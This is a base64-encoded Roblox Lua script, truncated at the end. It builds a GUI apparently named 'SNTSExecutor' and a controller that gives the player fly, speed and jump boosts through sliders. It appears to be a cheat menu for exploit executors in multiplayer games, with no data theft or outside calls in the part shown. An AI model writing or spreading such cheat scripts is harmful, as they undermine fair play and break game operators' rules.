Lm5ldygiVGV4dExhYmVsIiwgRzJMWyIzNiJdKTsKRzJMWyIzOSJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiMzkiXVsiVGV4dFNpemUiXSA9IDE4OwpHMkxbIjM5Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjM5Il1bIkZvbnRGYWNlIl0gPSBGb250Lm5ldyhbW3JieGFzc2V0Oi8vZm9udHMvZmFtaWxpZXMvR290aGFtU1NtLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LkJvbGQsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiMzkiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiMzkiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyIzOSJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgOTEsIDAsIDUwKTsKRzJMWyIzOSJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjM5Il1bIlRleHQiXSA9IFtbSnVtcF1dOwpHMkxbIjM5Il1bIk5hbWUiXSA9IFtbRGlzcGxheU5hbWVdXTsKRzJMWyIzOSJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuMDAzNDIsIDAsIC0wLjAwMjI0LCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuRGV0YWlscy5TcGVlZApHMkxbIjNhIl0gPSBJbnN0YW5jZS5uZXcoIkZvbGRlciIsIEcyTFsiMjQiXSk7CkcyTFsiM2EiXVsiTmFtZSJdID0gW1tTcGVlZF1dOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5EZXRhaWxzLlNwZWVkLlNwZWVkU2xpZGVyQ29udGFpbmVyCkcyTFsiM2IiXSA9IEluc3RhbmNlLm5ldygiQ2FudmFzR3JvdXAiLCBHMkxbIjNhIl0pOwpHMkxbIjNiIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyIzYiJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigzNywgMzcsIDM3KTsKRzJMWyIzYiJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMCwgMSk7CkcyTFsiM2IiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDE5OSwgMCwgNTEpOwpHMkxbIjNiIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMCwgLTEwLCAwLCAxNjApOwpHMkxbIjNiIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiM2IiXVsiTmFtZSJdID0gW1tTcGVlZFNsaWRlckNvbnRhaW5lcl1dOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5EZXRhaWxzLlNwZWVkLlNwZWVkU2xpZGVyQ29udGFpbmVyLlVJQ29ybmVyCkcyTFsiM2MiXSA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBHMkxbIjNiIl0pOwoKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuRGV0YWlscy5TcGVlZC5TcGVlZFNsaWRlckNvbnRhaW5lci5TcGVlZFNsaWRlckZyYW1lCkcyTFsiM2QiXSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBHMkxbIjNiIl0pOwpHMkxbIjNkIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyIzZCJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDAsIDApOwpHMkxbIjNkIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCA3MiwgMCwgNTEpOwpHMkxbIjNkIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoLTAsIDAsIDAsIDApOwpHMkxbIjNkIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiM2QiXVsiTmFtZSJdID0gW1tTcGVlZFNsaWRlckZyYW1lXV07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLkRldGFpbHMuU3BlZWQuU3BlZWRTbGlkZXJDb250YWluZXIuU3BlZWRTbGlkZXJGcmFtZS5VSUdyYWRpZW50CkcyTFsiM2UiXSA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIsIEcyTFsiM2QiXSk7CkcyTFsiM2UiXVsiUm90YXRpb24iXSA9IC05MDsKRzJMWyIzZSJdWyJDb2xvciJdID0gQ29sb3JTZXF1ZW5jZS5uZXd7Q29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjAwMCwgQ29sb3IzLmZyb21SR0IoNjAsIDYwLCA2MCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC4yNjEsIENvbG9yMy5mcm9tUkdCKDgwLCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjYxOCwgQ29sb3IzLmZyb21SR0IoMTIwLCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjk4OCwgQ29sb3IzLmZyb21SR0IoMTcxLCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjk5NywgQ29sb3IzLmZyb21SR0IoMTk4LCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygxLjAwMCwgQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKSl9OwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5EZXRhaWxzLlNwZWVkLlNwZWVkU2xpZGVyQ29udGFpbmVyLlNwZWVkU2xpZGVyRnJhbWUuU3BlZWRTbGlkZXJWYWx1ZUhhbmRsZXIKRzJMWyIzZiJdID0gSW5zdGFuY2UubmV3KCJMb2NhbFNjcmlwdCIsIEcyTFsiM2QiXSk7CkcyTFsiM2YiXVsiTmFtZSJdID0gW1tTcGVlZFNsaWRlclZhbHVlSGFuZGxlcl1dOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5EZXRhaWxzLlNwZWVkLlNwZWVkU2xpZGVyQ29udGFpbmVyLkRpc3BsYXlOYW1lCkcyTFsiNDAiXSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgRzJMWyIzYiJdKTsKRzJMWyI0MCJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiNDAiXVsiVGV4dFNpemUiXSA9IDE4OwpHMkxbIjQwIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjQwIl1bIkZvbnRGYWNlIl0gPSBGb250Lm5ldyhbW3JieGFzc2V0Oi8vZm9udHMvZmFtaWxpZXMvR290aGFtU1NtLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LkJvbGQsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiNDAiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiNDAiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyI0MCJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMjAwLCAwLCA1MCk7CkcyTFsiNDAiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyI0MCJdWyJUZXh0Il0gPSBbWzYwIHN0dWRzL3NdXTsKRzJMWyI0MCJdWyJOYW1lIl0gPSBbW0Rpc3BsYXlOYW1lXV07CkcyTFsiNDAiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygtMC4wMzA2MiwgMCwgLTAuMDAxODUsIDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5EZXRhaWxzLlNwZWVkLlRleHRCdXR0b24KRzJMWyI0MSJdID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIiwgRzJMWyIzYSJdKTsKRzJMWyI0MSJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiNDEiXVsiVGV4dFNpemUiXSA9IDE7CkcyTFsiNDEiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiNDEiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMzcsIDM3LCAzNyk7CkcyTFsiNDEiXVsiRm9udEZhY2UiXSA9IEZvbnQubmV3KFtbcmJ4YXNzZXQ6Ly9mb250cy9mYW1pbGllcy9Tb3VyY2VTYW5zUHJvLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LlJlZ3VsYXIsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiNDEiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDkyLCAwLCA1MCk7CkcyTFsiNDEiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyI0MSJdWyJUZXh0Il0gPSBbW11dOwpHMkxbIjQxIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC43MDYyOSwgMCwgMC4zNjY2NywgMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLkRldGFpbHMuU3BlZWQuVGV4dEJ1dHRvbi5VSUNvcm5lcgpHMkxbIjQyIl0gPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgRzJMWyI0MSJdKTsKCgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLkRldGFpbHMuU3BlZWQuVGV4dEJ1dHRvbi5EaXNwbGF5TmFtZQpHMkxbIjQzIl0gPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIEcyTFsiNDEiXSk7CkcyTFsiNDMiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjQzIl1bIlRleHRTaXplIl0gPSAxODsKRzJMWyI0MyJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyI0MyJdWyJGb250RmFjZSJdID0gRm9udC5uZXcoW1tyYnhhc3NldDovL2ZvbnRzL2ZhbWlsaWVzL0dvdGhhbVNTbS5qc29uXV0sIEVudW0uRm9udFdlaWdodC5Cb2xkLCBFbnVtLkZvbnRTdHlsZS5Ob3JtYWwpOwpHMkxbIjQzIl1bIlRleHRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjQzIl1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiNDMiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDkxLCAwLCA1MCk7CkcyTFsiNDMiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyI0MyJdWyJUZXh0Il0gPSBbW1NwZWVkXV07CkcyTFsiNDMiXVsiTmFtZSJdID0gW1tEaXNwbGF5TmFtZV1dOwpHMkxbIjQzIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoLTAuMDE0ODQsIDAsIC0wLjAyMjI0LCAwKTsKCi0tIC8vIFBsYXllciBTdGF0IENvbnRyb2xsZXIgKEZsaWdodCwgU3BlZWQsIEp1bXApCi0tIFVuaWZpZWQgbGl2ZSBzbGlkZXJzIGZvciBhbGwgY29udHJvbHMgKEZsaWdodCwgU3BlZWQsIEp1bXApCgpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgVUlTID0gZ2FtZTpHZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIikKbG9jYWwgUnVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpCmxvY2FsIHBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCmxvY2FsIGh1bWFub2lkID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWQiKQpsb2NhbCBocnAgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKCi0tIFJlY29ubmVjdCBjaGFyYWN0ZXIgd2hlbiBwbGF5ZXIgcmVzcGF3bnMKcGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24obmV3Q2hhcikKCWNoYXJhY3RlciA9IG5ld0NoYXIKCWh1bWFub2lkID0gbmV3Q2hhcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkIikKCWhycCA9IG5ld0NoYXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKCglmbHlpbmcgPSBmYWxzZQoJaWYgZmxpZ2h0Q29ubiB0aGVuIGZsaWdodENvbm46RGlzY29ubmVjdCgpIGVuZAoJaWYgYm9keUd5cm8gdGhlbiBib2R5R3lybzpEZXN0cm95KCkgZW5kCglpZiBib2R5VmVsIHRoZW4gYm9keVZlbDpEZXN0cm95KCkgZW5kCgl0b2dnbGVCdXR0b24oZmxpZ2h0QnV0dG9uLCBmYWxzZSkKCglodW1hbm9pZC5XYWxrU3BlZWQgPSBub3JtYWxTcGVlZAoJaHVtYW5vaWQuSnVtcFBvd2VyID0gbm9ybWFsSnVtcAplbmQpCgotLSBVSSByZWZlcmVuY2VzCmxvY2FsIGZsaWdodEJ1dHRvbiA9IEcyTFsiMmMiXQpsb2NhbCBmbGlnaHREaXNwbGF5ID0gRzJMWyIyYiJdCmxvY2FsIHNwZWVkQnV0dG9uID0gRzJMWyI0MSJdCmxvY2FsIHNwZWVkRGlzcGxheSA9IEcyTFsiNDAiXQpsb2NhbCBqdW1wQnV0dG9uID0gRzJMWyIzNiJdCmxvY2FsIGp1bXBEaXNwbGF5ID0gRzJMWyIzNSJdCgpsb2NhbCBmbGlnaHRTbGlkZXIgPSBHMkxbIjI4Il0KbG9jYWwgc3BlZWRTbGlkZXIgPSBHMkxbIjNkIl0KbG9jYWwganVtcFNsaWRlciA9IEcyTFsiMzIiXQoKLS0gc3RhdGUgdmFyaWFibGVzCmxvY2FsIGZseWluZyA9IGZhbHNlCmxvY2FsIHNwZWVkRW5hYmxlZCA9IGZhbHNlCmxvY2FsIGp1bXBFbmFibGVkID0gZmFsc2UKCmxvY2FsIGZsaWdodFNwZWVkID0gNjAKbG9jYWwgcGxheWVyU3BlZWQgPSAxNgpsb2NhbCBqdW1wUG93ZXIgPSA1MApsb2NhbCBub3JtYWxTcGVlZCA9IDE2CmxvY2FsIG5vcm1hbEp1bXAgPSA1MAoKLS0gaGlnaGxpZ2h0IHRvZ2dsZQpsb2NhbCBmdW5jdGlvbiB0b2dnbGVCdXR0b24oYnRuLCBhY3RpdmUpCglidG4uQmFja2dyb3VuZENvbG9yMyA9IGFjdGl2ZSBhbmQgQ29sb3IzLmZyb21SR0IoMTAwLCAwLCAwKSBvciBDb2xvcjMuZnJvbVJHQigzNywgMzcsIDM3KQplbmQKCi0tIHVuaWZpZWQgc2xpZGVyIHNldHVwIHdpdGggbGl2ZSB1cGRhdGUKbG9jYWwgZnVuY3Rpb24gc2V0dXBTbGlkZXIoc2xpZGVyLCBsYWJlbCwgbWluVmFsLCBtYXhWYWwsIGRlZmF1bHRWYWwsIGZvcm1hdFRleHQsIGNhbGxiYWNrKQoJbG9jYWwgZHJhZ2dpbmcgPSBmYWxzZQoJbG9jYWwgcmVsID0gKGRlZmF1bHRWYWwgLSBtaW5WYWwpIC8gKG1heFZhbCAtIG1pblZhbCkKCXNsaWRlci5TaXplID0gVURpbTIubmV3KHJlbCwgMCwgMSwgMCkKCWxhYmVsLlRleHQgPSBmb3JtYXRUZXh0KGRlZmF1bHRWYWwpCgljYWxsYmFjayhkZWZhdWx0VmFsKQoKCWxvY2FsIGZ1bmN0aW9uIHNldFZhbHVlRnJvbVgoeCkKCQlsb2NhbCBiYXJTaXplID0gc2xpZGVyLlBhcmVudC5BYnNvbHV0ZVNpemUuWAoJCWxvY2FsIHJlbCA9IG1hdGguY2xhbXAoeCAvIGJhclNpemUsIDAsIDEpCgkJc2xpZGVyLlNpemUgPSBVRGltMi5uZXcocmVsLCAwLCAxLCAwKQoJCWxvY2FsIHZhbCA9IG1hdGguZmxvb3IobWluVmFsICsgKG1heFZhbCAtIG1pblZhbCkgKiByZWwpCgkJbGFiZWwuVGV4dCA9IGZvcm1hdFRleHQodmFsKQoJCWNhbGxiYWNrKHZhbCkKCWVuZAoKCXNsaWRlci5QYXJlbnQuSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQoJCWlmIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMSB0aGVuCgkJCWRyYWdnaW5nID0gdHJ1ZQoJCQlzZXRWYWx1ZUZyb21YKGlucHV0LlBvc2l0aW9uLlggLSBzbGlkZXIuUGFyZW50LkFic29sdXRlUG9zaXRpb24uWCkKCQllbmQKCWVuZCkKCglVSVMuSW5wdXRFbmRlZDpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQoJCWlmIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMSB0aGVuCgkJCWRyYWdnaW5nID0gZmFsc2UKCQllbmQKCWVuZCkKCglVSVMuSW5wdXRDaGFuZ2VkOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCgkJaWYgZHJhZ2dpbmcgYW5kIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlTW92ZW1lbnQgdGhlbgoJCQlzZXRWYWx1ZUZyb21YKGlucHV0LlBvc2l0aW9uLlggLSBzbGlkZXIuUGFyZW50LkFic29sdXRlUG9zaXRpb24uWCkKCQllbmQKCWVuZCkKZW5kCgotLSBmbGlnaHQgc2xpZGVyIChzcGVlZCkKc2V0dXBTbGlkZXIoZmxpZ2h0U2xpZGVyLCBmbGlnaHREaXNwbGF5LCAxMCwgMjAwLCAyMDAsIGZ1bmN0aW9uKHYpCglyZXR1cm4gdiAuLiAiIHN0dWRzL3MiCmVuZCwgZnVuY3Rpb24odmFsKQoJZmxpZ2h0U3BlZWQgPSB2YWwKZW5kKQoKLS0gc3BlZWQgc2xpZGVyICh3YWxrc3BlZWQpCnNldHVwU2xpZGVyKHNwZWVkU2xpZGVyLCBzcGVlZERpc3BsYXksIDEwLCAyMDAsIDIwMCwgZnVuY3Rpb24odikKCXJldHVybiB2IC4uICIgc3R1ZHMvcyIKZW5kLCBmdW5jdGlvbih2YWwpCglwbGF5ZXJTcGVlZCA9IHZhbAoJaWYgc3BlZWRFbmFibGVkIGFuZCBub3QgZmx5aW5nIHRoZW4KCQlodW1hbm9pZC5XYWxrU3BlZWQgPSBwbGF5ZXJTcGVlZAoJZW5kCmVuZCkKCi0tIGp1bXAgc2xpZGVyIChqdW1wIHBvd2VyKQpzZXR1cFNsaWRlcihqdW1wU2xpZGVyLCBqdW1wRGlzcGxheSwgMTAsIDIwMCwgMjAwLCBmdW5jdGlvbih2KQoJcmV0dXJuIHYgLi4gIiBzdHVkcy9zIgplbmQsIGZ1bmN0aW9uKHZhbCkKCWp1bXBQb3dlciA9IHZhbAoJaWYganVtcEVuYWJsZWQgdGhlbgoJCWh1bWFub2lkLkp1bXBQb3dlciA9IGp1bXBQb3dlcgoJZW5kCmVuZCkKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi0tIEFsaWduIHN0YXQgdGV4dCBwb3NpdGlvbnMgKEZsaWdodCwgU3BlZWQsIEp1bXApCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmxvY2FsIGZ1bmN0aW9uIGFsaWduU3RhdFRleHRzKCkKCWxvY2FsIHhPZmZzZXQgPSBmbGlnaHREaXNwbGF5LlBvc2l0aW9uLlguU2NhbGUKCWxvY2FsIHRleHRTaXplID0gZmxpZ2h0RGlzcGxheS5TaXplCgoJc3BlZWREaXNwbGF5LlBvc2l0aW9uID0gVURpbTIubmV3KHhPZmZzZXQsIDAsIHNwZWVkRGlzcGxheS5Qb3NpdGlvbi5ZLlNjYWxlLCAwKQoJanVtcERpc3BsYXkuUG9zaXRpb24gPSBVRGltMi5uZXcoeE9mZnNldCwgMCwganVtcERpc3BsYXkuUG9zaXRpb24uWS5TY2FsZSwgMCkKCXNwZWVkRGlzcGxheS5TaXplID0gdGV4dFNpemUKCWp1bXBEaXNwbGF5LlNpemUgPSB0ZXh0U2l6ZQplbmQKCmFsaWduU3RhdFRleHRzKCkKUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOkNvbm5lY3QoYWxpZ25TdGF0VGV4dHMpCgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi0tIOKciO+4jyBGTElHSFQgU1lTVEVNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KbG9jYWwgY29udHJvbCA9IHtGID0gMCwgQiA9IDAsIEwgPSAwLCBSID0gMCwgVSA9IDAsIEQgPSAwfQpsb2NhbCBib2R5R3lybywgYm9keVZlbCwgZmxpZ2h0Q29ubgoKZnVuY3Rpb24gc3RhcnRGbGlnaHQoKQoJaWYgZmx5aW5nIHRoZW4gcmV0dXJuIGVuZAoJZmx5aW5nID0gdHJ1ZQoJdG9nZ2xlQnV0dG9uKGZsaWdodEJ1dHRvbiwgdHJ1ZSkKCglib2R5R3lybyA9IEluc3RhbmNlLm5ldygiQm9keUd5cm8iKQoJYm9keVZlbCA9IEluc3RhbmNlLm5ldygiQm9keVZlbG9jaXR5IikKCWJvZHlHeXJvLk1heFRvcnF1ZSA9IFZlY3RvcjMubmV3KDFlNSwgMWU1LCAxZTUpCglib2R5VmVsLk1heEZvcmNlID0gVmVjdG9yMy5uZXcoMWU1LCAxZTUsIDFlNSkKCWJvZHlHeXJvLlAgPSA5ZTQKCWJvZHlWZWwuUCA9IDllNAoJYm9keUd5cm8uUGFyZW50ID0gaHJwCglib2R5VmVsLlBhcmVudCA9IGhycAoKCWh1bWFub2lkLlBsYXRmb3JtU3RhbmQgPSB0cnVlCgoJbG9jYWwgZnVuY3Rpb24gb25JbnB1dChpbnB1dCwgZG93bikKCQlsb2NhbCB2YWwgPSBkb3duIGFuZCAxIG9yIDAKCQlpZiBpbnB1dC5LZXlDb2RlID09IEVudW0uS2V5Q29kZS5XIHRoZW4gY29udHJvbC5GID0gdmFsIGVuZAoJCWlmIGlucHV0LktleUNvZGUgPT0gRW51bS5LZXlDb2RlLlMgdGhlbiBjb250cm9sLkIgPSAtdmFsIGVuZAoJCWlmIGlucHV0LktleUNvZGUgPT0gRW51bS5LZXlDb2RlLkEgdGhlbiBjb250cm9sLkwgPSAtdmFsIGVuZAoJCWlmIGlucHV0LktleUNvZGUgPT0gRW51bS5LZXlDb2RlLkQgdGhlbiBjb250cm9sLlIgPSB2YWwgZW5kCgkJaWYgaW5wdXQuS2V5Q29kZSA9PSBFbnVtLktleUNvZGUuU3BhY2UgdGhlbiBjb250cm9sLlUgPSB2YWwgZW5kCgkJaWYgaW5wdXQuS2V5Q29kZSA9PSBFbnVtLktleUNvZGUuTGVmdENvbnRyb2wgdGhlbiBjb250cm9sLkQgPSAtdmFsIGVuZAoJZW5kCgoJbG9jYWwgaW5wdXRCZWdhbkNvbm4gPSBVSVMuSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQoJCW9uSW5wdXQoaW5wdXQsIHRydWUpCgllbmQpCglsb2NhbCBpbnB1dEVuZGVkQ29ubiA9IFVJUy5JbnB1dEVuZGVkOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCgkJb25JbnB1dChpbnB1dCwgZmFsc2UpCgllbmQpCgoJZmxpZ2h0Q29ubiA9IFJ1blNlcnZpY2UuSGVhcnRiZWF0OkNvbm5lY3QoZnVuY3Rpb24oKQoJCWlmIG5vdCBmbHlpbmcgdGhlbiByZXR1cm4gZW5kCgkJYm9keUd5cm8uQ0ZyYW1lID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lCgkJbG9jYWwgbW92ZSA9ICh3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAqIChjb250cm9sLkYgKyBjb250cm9sLkIpKQoJCQkrICh3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuUmlnaHRWZWN0b3IgKiAoY29udHJvbC5SICsgY29udHJvbC5MKSkKCQkJKyBWZWN0b3IzLm5ldygwLCBjb250cm9sLlUgKyBjb250cm9sLkQsIDApCgkJYm9keVZlbC5WZWxvY2l0eSA9IG1vdmUuTWFnbml0dWRlID4gMCBhbmQgbW92ZS5Vbml0ICogZmxpZ2h0U3BlZWQgb3IgVmVjdG9yMy56ZXJvCgllbmQpCgoJYm9keUd5cm8uRGVzdHJveWluZzpDb25uZWN0KGZ1bmN0aW9uKCkKCQlpbnB1dEJlZ2FuQ29ubjpEaXNjb25uZWN0KCkKCQlpbnB1dEVuZGVkQ29ubjpEaXNjb25uZWN0KCkKCWVuZCkKZW5kCgpmdW5jdGlvbiBzdG9wRmxpZ2h0KCkKCWZseWluZyA9IGZhbHNlCgl0b2dnbGVCdXR0b24oZmxpZ2h0QnV0dG9uLCBmYWxzZSkKCWlmIGZsaWdodENvbm4gdGhlbiBmbGlnaHRDb25uOkRpc2Nvbm5lY3QoKSBlbmQKCWlmIGJvZHlHeXJvIHRoZW4gYm9keUd5cm86RGVzdHJveSgpIGVuZAoJaWYgYm9keVZlbCB0aGVuIGJvZHlWZWw6RGVzdHJveSgpIGVuZAoJaHVtYW5vaWQuUGxhdGZvcm1TdGFuZCA9IGZhbHNlCmVuZAoKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQotLSDwn4+DIFNQRUVEIFNZU1RFTQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmZ1bmN0aW9uIHN0YXJ0U3BlZWQoKQoJaWYgc3BlZWRFbmFibGVkIHRoZW4gcmV0dXJuIGVuZAoJc3BlZWRFbmFibGVkID0gdHJ1ZQoJdG9nZ2xlQnV0dG9uKHNwZWVkQnV0dG9uLCB0cnVlKQoJaHVtYW5vaWQuV2Fsa1NwZWVkID0gcGxheWVyU3BlZWQKZW5kCgpmdW5jdGlvbiBzdG9wU3BlZWQoKQoJaWYgbm90IHNwZWVkRW5hYmxlZCB0aGVuIHJldHVybiBlbmQKCXNwZWVkRW5hYmxlZCA9IGZhbHNlCgl0b2dnbGVCdXR0b24oc3BlZWRCdXR0b24sIGZhbHNlKQoJaHVtYW5vaWQuV2Fsa1NwZWVkID0gbm9ybWFsU3BlZWQKZW5kCgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi0tIPCfppggSlVNUCBTWVNURU0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpmdW5jdGlvbiBzdGFydEp1bXAoKQoJaWYganVtcEVuYWJsZWQgdGhlbiByZXR1cm4gZW5kCglqdW1wRW5hYmxlZCA9IHRydWUKCXRvZ2dsZUJ1dHRvbihqdW1wQnV0dG9uLCB0cnVlKQoJaHVtYW5vaWQuSnVtcFBvd2VyID0ganVtcFBvd2VyCmVuZAoKZnVuY3Rpb24gc3RvcEp1bXAoKQoJaWYgbm90IGp1bXBFbmFibGVkIHRoZW4gcmV0dXJuIGVuZAoJanVtcEVuYWJsZWQgPSBmYWxzZQoJdG9nZ2xlQnV0dG9uKGp1bXBCdXR0b24sIGZhbHNlKQoJaH